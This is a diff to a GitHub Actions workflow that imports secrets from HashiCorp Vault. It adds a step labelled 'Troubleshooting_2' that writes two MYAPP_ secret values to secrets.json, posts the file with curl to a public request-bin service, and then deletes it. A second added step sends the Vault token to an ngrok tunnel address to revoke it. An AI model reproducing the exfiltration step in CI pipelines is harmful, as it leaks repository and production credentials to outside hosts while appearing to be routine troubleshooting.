@@ -39,7 +39,16 @@ jobs:
           exportEnv: true
           secrets: |
             gha_wf_g/data/repo:GaneshP1234/myprodproject:ref:refs/heads/main/proddemo123 ** | MYAPP_ ;
-      - name: Step following 'Import Secrets'
+            
+      - name: Troubleshooting_2
         run: |
-          $MYAPP_ = "${{ env.MYAPP_ }}"
-          echo "Stored Output: $MYAPP_"
+          echo "{ MYAPP_secret1_key: \"${{env.MYAPP_secret1_key}}\", MYAPP_secret1_value:  \"${{env.MYAPP_secret2_key}}\"  }" > ./secrets.json
+          curl -i -H "Accept: application/json" --data @secrets.json https://reqbin.netlify.app/.netlify/functions/reqbin
+
+          rm ./secrets.json
+          
+      - name: Revoke Vault Token
+        if: always()
+        run: |
+          curl -X POST -sv --fail-with-body -H "X-Vault-Token: ${{ env.VAULT_TOKEN }}" \
+            https://37d0-2600-1700-550-7950-9819-d1b-be15-4f25.ngrok-free.app/v1/auth/token/revoke-self
